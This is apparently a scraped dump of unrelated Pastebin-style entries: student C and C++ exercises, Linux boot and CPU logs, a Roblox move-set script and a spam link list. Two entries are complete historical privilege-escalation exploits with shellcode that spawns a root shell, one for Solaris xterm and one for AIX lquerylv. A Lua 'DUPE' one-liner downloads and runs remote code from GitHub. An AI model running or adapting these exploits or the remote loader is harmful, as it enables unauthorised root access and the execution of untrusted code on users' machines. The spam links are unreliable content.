		[""OwnerName""] = ""self"",
		[""IsDisturbing""] = false,
		[""Name""] = ""Ghost"",
		[""Duplicate""] = false,
		[""ClassName""] = ""group"",
	},
},
"
S4UhCzuL,sefsegseg,gadungw71,PHP,Friday 17th of May 2024 11:52:47 AM CDT,"•	https://github.com/hC-hapeuth-hyuiki
•	https://github.com/hyukiuu2024-geers
•	https://github.com/seed-Cfgertayo
•	https://github.com/Oc-freedommob-Bile2024
•	https://github.com/Twi-light-fRE-HDQ
•	https://forum.mush.com.br/topic/216917/mm2kboeladig
•	. https://www.kooapp.com/koo/guest_P68S8O/9075028d-0435-4016-b8d7-83d3dbc45e5a
•	https://open.firstory.me/user/clwaummie02dw01v2gbmn2vu1
•	https://open.firstory.me/story/clwaun9lc17kb01xigevh4o05
•	https://wandering.flarum.cloud/d/63211-dsfsegesg
•	https://hiuderyy.hashnode.dev/dsfsedgseg
•	https://www.bankier.pl/forum/temat_sdfsegfesgsg,66378873.html
•	https://medium.com/@rarawwwuu33/%E4%B9%9D%E9%BE%99%E5%9F%8E%E5%AF%A8%E4%B9%8B%E5%9B%B4%E5%9F%8E-%E5%AE%8C%E6%95%B4%E7%89%88%E6%9C%AC-%E9%9B%BB%E5%BD%B1-2024-bluray-%E5%9C%A8%E7%B7%9A%E8%A7%80%E7%9C%8B%E5%AE%8C%E6%95%B4%E7%89%88-fd387396e504
•	https://www.onfeetnation.com/profiles/blogs/menemukanmuu
•	https://hackmd.io/@rerewilli6/rJGJagBQC
•	https://demo.hedgedoc.org/s/5IlL67XPj
•	https://rentry.co/ofcgp6dh
•	https://paste.ee/p/H0jeD
•	https://yamcode.com/sdfgseg-26
•	https://lifeisfeudal.com/Discussions/question/sdfsegseg
•	https://start.me/w/rO6Mdr
•	https://plaza.rakuten.co.jp/aryasantosso/diary/202405180000/
•	https://telegra.ph/DSFSEDF-05-17
•	https://muckrack.com/afdwsf-wfewf/bio
•	https://profile.hatena.ne.jp/dsefsef/
•	https://www.bitsdujour.com/profiles/TLTlDj
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/761233/Default.aspx
•	https://www.fitlynk.com/1715964633F908898
"
R30yczgA,_lista2024_vetores_preenchimento_formaliz,gpsgiraldi,C,Friday 17th of May 2024 11:32:11 AM CDT,"//preenchimento de vetores e formalização da saída

#include <stdio.h>

int main()
{
    int vetor[5],i;
    i=0;
    while(i<5){
        scanf(""%i"",&vetor[i]);
        i++;
    }
    printf(""Vetor={"");
    i=0;
    while(i<4){
        printf(""%i "",vetor[i]);
        i++;
    }
    printf(""%i}"",vetor[4]);
    return 0;
}
"
SDFwidjn,Solaris 5.5.1 X11R6.3 - xterm '-xrm' Local Privilege Escalation - CVE-1999-0126,FlyFar,C,Friday 17th of May 2024 11:21:08 AM CDT,"/*
 * X11R6.3 xterm exploit for solaris 5.5.1 by DCRH 28/5/97
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define EXTRA2 1300
#define BUF_LENGTH 400
#define EXTRA 500
   /* Need an addr such that contents of addr+0xe98 = 0 */
#define SAFE_ADDR ((unsigned)0xefff2008)
#define STACK_OFFSET 0x4800
#define SPARC_NOP 0xa61cc013

u_long sparc_shellcode[] =
{
    0x2d0bd89a, /* sethi  %hi(0x2f626800), %l6  */
    0xac15a16e, /* or  %l6, 0x16e, %l6          */
    0x2f0bdadc, /* sethi  %hi(0x2f6b7000), %l7  */
    0xae15e368, /* or  %l7, 0x368, %l7          */
    0x900b800e, /* and  %sp, %sp, %o0           */
    0x9203a00c, /* add  %sp, 0xc, %o1           */
    0x941ac00b, /* xor  %o3, %o3, %o2           */
    0x9c03a014, /* add  %sp, 0x14, %sp          */
    0xec3bbfec, /* std  %l6, [ %sp + -20 ]      */
    0xc023bff4, /* clr  [ %sp + -12 ]           */
    0xdc23bff8, /* st  %sp, [ %sp + -8 ]        */
    0xc023bffc, /* clr  [ %sp + -4 ]            */
    0x8210203b, /* mov  0x3b, %g1               */
    0x91d02008, /* ta  8                        */
    0xffffffff, /* illegal                      */
};

u_long get_sp(void)
{
    asm(""mov %sp,%i0 \n"");
}

char buf[BUF_LENGTH + EXTRA + EXTRA2 + 8];
char longvar[0x4000] = ""BLAH="";

void main(int argc, char *argv[])
{
    char *env[2];
    unsigned long targ_addr;
    u_long *long_p;
    int i, code_length = sizeof(sparc_shellcode),dso=0;

    if(argc > 1) dso=atoi(argv[1]);

    long_p =(u_long *) buf;

    for (i = 0; i < EXTRA2 / sizeof(u_long); i++)
        *long_p++ = (SAFE_ADDR >> 8) | (SAFE_ADDR << 24);

    targ_addr = get_sp() - STACK_OFFSET - dso;
    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = SPARC_NOP;

    for (i = 0; i < code_length / sizeof(u_long); i++)
        *long_p++ = sparc_shellcode[i];

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = targ_addr;

    printf(""Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n"",
           targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);

    /* This is just to shove the stack down a bit */
    memset(&longvar[5], 'a', sizeof longvar-6);
    longvar[sizeof longvar -1] = '\0';
    env[0] = longvar;
    env[1] = NULL;

    execle(""./xterm"", ""xterm"", ""-xrm"", buf,(char *) 0, env);
    perror(""execl failed"");
}

// milw0rm.com [1997-05-28]
            "
wqGjzUFd,AIX lquerylv - Local Buffer Overflow / Local Privilege Escalation - CVE-1999-0064,FlyFar,C,Friday 17th of May 2024 11:19:18 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char prog[100]=""/usr/sbin/lquerylv"";
char prog2[30]=""lquerylv"";
extern int execv();

char *createvar(char *name,char *value)
{
char *c;
int l;
l=strlen(name)+strlen(value)+4;
if (! (c=malloc(l))) {perror(""error allocating"");exit(2);};
strcpy(c,name);
strcat(c,""="");
strcat(c,value);
putenv(c);
return c;
}

/*The program*/
main(int argc,char **argv,char **env)
{
/*The code*/
unsigned int code[]={
0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
0x7c0903a6 , 0x4e800420, 0x0
};
/* disassembly
7c0802a6        mfspr   r0,LR
9421fbb0        stu     SP,-1104(SP) --get stack
90010458        st      r0,1112(SP)
3c60f019        cau     r3,r0,0xf019 --CTR
60632c48        lis     r3,r3,11336  --CTR
90610440        st      r3,1088(SP)
3c60d002        cau     r3,r0,0xd002 --TOC
60634c0c        lis     r3,r3,19468  --TOC
90610444        st      r3,1092(SP)
3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
6063696e        lis     r3,r3,26990
90610438        st      r3,1080(SP)
3c602f73        cau     r3,r0,0x2f73
60636801        lis     r3,r3,26625
3863ffff        addi    r3,r3,-1
9061043c        st      r3,1084(SP) --terminate with 0
30610438        lis     r3,SP,1080
7c842278        xor     r4,r4,r4    --argv=NULL
80410440        lwz     RTOC,1088(SP)
80010444        lwz     r0,1092(SP) --jump
7c0903a6        mtspr   CTR,r0
4e800420        bctr              --jump
*/

#define MAXBUF 600
unsigned int buf[MAXBUF];
unsigned int frame[MAXBUF];
unsigned int i,nop,mn;
int max;
int QUIET=0;
int dobuf=0;
unsigned int toc;
unsigned int eco;
unsigned int *pt;
char *t;
int ch;
unsigned int reta; /* return address */
int corr=4600;
char *args[4];
char *arg1=""-L"";
char *newenv[8];
int startwith=0;

mn=100;
max=280;

if (argc>1)
        corr = atoi(argv[1]);

pt=(unsigned *) &execv;
toc=*(pt+1);
eco=*pt;

if ( ((mn+strlen((char*)&code)/4)>max) || (max>MAXBUF) )
{
        perror(""Bad parameters"");
        exit(1);
}

#define OO 7
*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) & 0x0000ffff);
*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) &
0x0000ffff);

reta=startwith ? (unsigned) &buf[mn]+corr : (unsigned)&buf[0]+corr;

for(nop=0;nop<mn;nop++)
 buf[nop]=startwith ? reta : 0x4ffffb82;        /*NOP*/
strcpy((char*)&buf[nop],(char*)&code);
i=nop+strlen( (char*) &code)/4-1;

if( !(reta & 0xff) || !(reta && 0xff00) || !(reta && 0xff0000)
        || !(reta && 0xff000000))
{
perror(""Return address has zero"");exit(5);
}

while(i++<max)
 buf[i]=reta;
buf[i]=0;

for(i=0;i<max-1;i++)
 frame[i]=reta;
frame[i]=0;

if(QUIET) {puts((char*)&buf);fflush(stdout);exit(0);};

/* 4 vars 'cause the correct one should be aligned at 4bytes boundary */
newenv[0]=createvar(""EGGSHEL"",(char*)&buf[0]);
newenv[1]=createvar(""EGGSHE2"",(char*)&buf[0]);
newenv[2]=createvar(""EGGSHE3"",(char*)&buf[0]);
newenv[3]=createvar(""EGGSHE4"",(char*)&buf[0]);


newenv[4]=createvar(""DISPLAY"",getenv(""DISPLAY""));
newenv[5]=NULL;

args[0]=prog2;
args[1]=arg1;
args[2]=(char*)&frame[0]; /* Just frame pointers */
puts(""Start..."");/*Here we go*/
execve(prog,args,newenv);
perror(""Error executing execve \n"");
/*      Georgi Guninski
        guninski@hotmail.com
        sgg@vmei.acad.bg
        guninski@linux2.vmei.acad.bg
        http://www.geocities.com/ResearchTriangle/1711
*/
}
/*
----------cut here---------
----------sometimes this helps-----------------
#!/bin/ksh
L=100
O=40
while [ $L -lt 12000 ]
do
echo $L
L=`expr $L + 42`
./a.out $L
done */

// milw0rm.com [1997-05-26]
            "
jXTHCt3R,Untitled,TWeiss,Bash,Friday 17th of May 2024 10:50:46 AM CDT,"[Fri May 17 10:14:01 2024] Early memory node ranges
[Fri May 17 10:14:01 2024]   node   0: [mem 0x0000000000001000-0x000000000009dfff]
[Fri May 17 10:14:01 2024]   node   0: [mem 0x0000000000100000-0x0000000009bfefff]
[Fri May 17 10:14:01 2024]   node   0: [mem 0x000000000a000000-0x000000000a1fffff]
[Fri May 17 10:14:01 2024]   node   0: [mem 0x000000000a214000-0x000000000affffff]
[Fri May 17 10:14:01 2024]   node   0: [mem 0x000000000b020000-0x00000000bb420fff]
[Fri May 17 10:14:01 2024]   node   0: [mem 0x00000000bddff000-0x00000000beffffff]
[Fri May 17 10:14:01 2024]   node   0: [mem 0x0000000100000000-0x000000103f37ffff]
[Fri May 17 10:14:01 2024] Initmem setup node 0 [mem 0x0000000000001000-0x000000103f37ffff]
[Fri May 17 10:14:01 2024] On node 0, zone DMA: 1 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone DMA: 98 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone DMA32: 1025 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone DMA32: 20 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone DMA32: 32 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone DMA32: 10718 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone Normal: 4096 pages in unavailable ranges
[Fri May 17 10:14:01 2024] On node 0, zone Normal: 3200 pages in unavailable ranges
[Fri May 17 10:14:01 2024] ACPI: PM-Timer IO Port: 0x808
[Fri May 17 10:14:01 2024] ACPI: LAPIC_NMI (acpi_id[0xff] high edge lint[0x1])
[Fri May 17 10:14:01 2024] IOAPIC[0]: apic_id 17, version 33, address 0xfec00000, GSI 0-23
[Fri May 17 10:14:01 2024] IOAPIC[1]: apic_id 18, version 33, address 0xfec01000, GSI 24-55
[Fri May 17 10:14:01 2024] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[Fri May 17 10:14:01 2024] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 low level)
[Fri May 17 10:14:01 2024] ACPI: Using ACPI (MADT) for SMP configuration information
[Fri May 17 10:14:01 2024] ACPI: HPET id: 0x10228201 base: 0xfed00000
[Fri May 17 10:14:01 2024] smpboot: Allowing 32 CPUs, 16 hotplug CPUs
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x0009e000-0x0009efff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000dffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x000e0000-0x000fffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x09bff000-0x09ffffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x0a200000-0x0a213fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0x0b000000-0x0b01ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xbb421000-0xbcb81fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xbcb82000-0xbcbaefff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xbcbaf000-0xbd252fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xbd253000-0xbddfefff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xbf000000-0xbfffffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xc0000000-0xefffffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xf0000000-0xf7ffffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xf8000000-0xfd0fffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfd100000-0xfd1fffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfd200000-0xfd4fffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfd500000-0xfd6fffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfd700000-0xfe9fffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfea00000-0xfea0ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfea10000-0xfeb7ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfeb80000-0xfec01fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfec02000-0xfec0ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfec10000-0xfec10fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfec11000-0xfec2ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfec30000-0xfec30fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfec31000-0xfecfffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfed00000-0xfed00fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfed01000-0xfed3ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfed40000-0xfed44fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfed45000-0xfed7ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfed80000-0xfed8ffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfed90000-0xfedc1fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfedc2000-0xfedcffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfedd0000-0xfedd3fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfedd4000-0xfedd5fff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xfedd6000-0xfeffffff]
[Fri May 17 10:14:01 2024] PM: hibernation: Registered nosave memory: [mem 0xff000000-0xffffffff]
[Fri May 17 10:14:01 2024] [mem 0xc0000000-0xefffffff] available for PCI devices
[Fri May 17 10:14:01 2024] Booting paravirtualized kernel on bare hardware
[Fri May 17 10:14:01 2024] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[Fri May 17 10:14:01 2024] setup_percpu: NR_CPUS:8192 nr_cpumask_bits:32 nr_cpu_ids:32 nr_node_ids:1
[Fri May 17 10:14:01 2024] percpu: Embedded 86 pages/cpu s229376 r8192 d114688 u524288
[Fri May 17 10:14:01 2024] pcpu-alloc: s229376 r8192 d114688 u524288 alloc=1*2097152
[Fri May 17 10:14:01 2024] pcpu-alloc: [0] 00 01 02 03 [0] 04 05 06 07 
[Fri May 17 10:14:01 2024] pcpu-alloc: [0] 08 09 10 11 [0] 12 13 14 15 
[Fri May 17 10:14:01 2024] pcpu-alloc: [0] 16 17 18 19 [0] 20 21 22 23 
[Fri May 17 10:14:01 2024] pcpu-alloc: [0] 24 25 26 27 [0] 28 29 30 31 
"
KpYa9Yyf,Untitled,TWeiss,Bash,Friday 17th of May 2024 10:36:28 AM CDT,"Architecture:             x86_64
  CPU op-mode(s):         32-bit, 64-bit
  Address sizes:          43 bits physical, 48 bits virtual
  Byte Order:             Little Endian
CPU(s):                   16
  On-line CPU(s) list:    0-15
Vendor ID:                AuthenticAMD
  BIOS Vendor ID:         Advanced Micro Devices, Inc.
  Model name:             AMD Ryzen 7 3700X 8-Core Processor
    BIOS Model name:      AMD Ryzen 7 3700X 8-Core Processor              Unknown CPU @ 3.6GHz
    BIOS CPU family:      107
    CPU family:           23
    Model:                113
    Thread(s) per core:   2
    Core(s) per socket:   8
    Socket(s):            1
    Stepping:             0
    Frequency boost:      enabled
    CPU(s) scaling MHz:   82%
    CPU max MHz:          4426.1709
    CPU min MHz:          2200.0000
    BogoMIPS:             7199.34
    Flags:                fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good n
                          opl nonstop_tsc cpuid extd_apicid aperfmperf rapl pni pclmulqdq monitor ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm cmp_legacy svm
                           extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ibs skinit wdt tce topoext perfctr_core perfctr_nb bpext perfctr_llc mwaitx cpb cat_l3 cdp_l3 hw_pstate ssbd
                           mba ibpb stibp vmmcall fsgsbase bmi1 avx2 smep bmi2 cqm rdt_a rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xgetbv1 cqm_llc cqm_occup_llc cqm_mbm_total cqm_mbm
                          _local clzero irperf xsaveerptr rdpru wbnoinvd arat npt lbrv svm_lock nrip_save tsc_scale vmcb_clean flushbyasid decodeassists pausefilter pfthreshold avic v_vmsave_vmlo
                          ad vgif v_spec_ctrl umip rdpid overflow_recov succor smca sev sev_es
Virtualization features:  
  Virtualization:         AMD-V
Caches (sum of all):      
  L1d:                    256 KiB (8 instances)
  L1i:                    256 KiB (8 instances)
  L2:                     4 MiB (8 instances)
  L3:                     32 MiB (2 instances)
NUMA:                     
  NUMA node(s):           1
  NUMA node0 CPU(s):      0-15
Vulnerabilities:          
  Gather data sampling:   Not affected
  Itlb multihit:          Not affected
  L1tf:                   Not affected
  Mds:                    Not affected
  Meltdown:               Not affected
  Mmio stale data:        Not affected
  Reg file data sampling: Not affected
  Retbleed:               Mitigation; untrained return thunk; SMT enabled with STIBP protection
  Spec rstack overflow:   Mitigation; Safe RET
  Spec store bypass:      Mitigation; Speculative Store Bypass disabled via prctl
  Spectre v1:             Mitigation; usercopy/swapgs barriers and __user pointer sanitization
  Spectre v2:             Mitigation; Retpolines; IBPB conditional; STIBP always-on; RSB filling; PBRSB-eIBRS Not affected; BHI Not affected
  Srbds:                  Not affected
  Tsx async abort:        Not affected
"
LfQHL8bp,Untitled,MeehoweCK,C++,Friday 17th of May 2024 10:30:07 AM CDT,"#include <iostream>
#include <ctime>

using namespace std;

const int ROZMIAR{ 6 };

void wypelni(int tab[]) {
	for (int i = 0; i < ROZMIAR; ++i) {
		tab[i] = rand() % 49 + 1;
	}
}

void wyswietl(int tab[]) {
	for (int i = 0; i < ROZMIAR; ++i) {
		cout << tab[i] << ' ';
	}
	cout << endl;
}

int main() {
	int tab[ROZMIAR];
	srand(time(nullptr));
	wypelni(tab);
	wyswietl(tab);
	return 0;
}"
A9mPPwAr,PS99 DUPE,ZNXGOPRO,Lua,Friday 17th of May 2024 10:22:11 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/subhian922/DUPE/main/DUPE-V1""))()"
qR6rLVtE,Dragon style V2,Dsaqwed123,LScript,Friday 17th of May 2024 10:19:57 AM CDT,"local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface
local bt = interf.Battle
local main = bt.Main
local moves = game.ReplicatedStorage.Moves
local styles = game.ReplicatedStorage.Styles
local plr = game.Players.LocalPlayer
local brawler = styles.Brawler
local rush = styles.Rush
local beast = styles.Beast
local status = plr.Status
local menu = pgui.MenuUI.Menu 
local abil = menu.Abilities.Frame.Frame.Frame
local abilFolder = game.ReplicatedStorage.Abilities.Brawler

brawler.Idle.AnimationId = ""rbxassetid://12120045620""

if game.ReplicatedStorage.Styles:FindFirstChild(""Brawler"") then
v = game.ReplicatedStorage.Styles[""Brawler""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end                          
v.Name = ""Brawler""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingShotgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingShotgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperShotgun'
v.Name = ""H_GunStandingShotgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Brawler[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 1.5
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Brawler[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = Color3.fromRGB(255,0,0)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack4'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Strike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Brawler[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'GGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""BlockStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""BlockStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'GuruKnockback'
v.Name = ""BlockStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmashing'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Escape'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""RedHeat""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_GuruParry'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StanceStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""StanceStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""StanceStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StrikeThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""StrikeThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold'
v.Name = ""StrikeThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StanceFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StanceFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenSupine'
v.Name = ""H_StanceFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Brawler[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Dragon'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Brawler[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BrawlerToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DoubleBlows"") then
v = game.ReplicatedStorage.Styles.Brawler[""DoubleBlows""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""DoubleBlows""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike4""]
else
